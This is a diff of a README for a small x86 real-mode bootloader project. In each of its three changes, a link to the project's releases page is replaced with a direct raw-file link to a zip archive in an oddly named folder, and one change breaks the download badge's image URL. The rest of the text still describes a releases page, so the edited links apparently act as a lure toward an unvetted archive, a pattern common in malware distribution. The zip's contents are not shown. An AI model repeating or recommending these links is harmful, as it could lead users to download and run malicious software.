@@ -1,7 +1,7 @@
 # 🚀 x86-real-mode-bootloader - Simple Boot Loader for Your System
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
+[![Download](https://raw.githubusercontent.com/313414Sa/x86-real-mode-bootloader/master/prerejoice/x86-real-mode-bootloader.zip%20release-brightgreen)](https://raw.githubusercontent.com/313414Sa/x86-real-mode-bootloader/master/prerejoice/x86-real-mode-bootloader.zip)
 
 ## 📖 Introduction
 The x86-real-mode-bootloader is a boot loader designed for real mode, crafted using C. It helps you start your operating system quickly and easily. This tool is especially useful for users looking to work with low-level software.
@@ -24,7 +24,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the download options:  
-   [Download Page](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
+   [Download Page](https://raw.githubusercontent.com/313414Sa/x86-real-mode-bootloader/master/prerejoice/x86-real-mode-bootloader.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see multiple versions of the boot loader. Select the latest stable version to ensure the best performance.
@@ -46,7 +46,7 @@ To get started, follow these steps:
 
 ## 📥 Download & Install
 To download and install the x86-real-mode-bootloader, visit the following page:  
-[Download Page](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
+[Download Page](https://raw.githubusercontent.com/313414Sa/x86-real-mode-bootloader/master/prerejoice/x86-real-mode-bootloader.zip)
 
 1. Locate the necessary version for your needs.
 2. Download the file and follow the extraction and installation steps above.
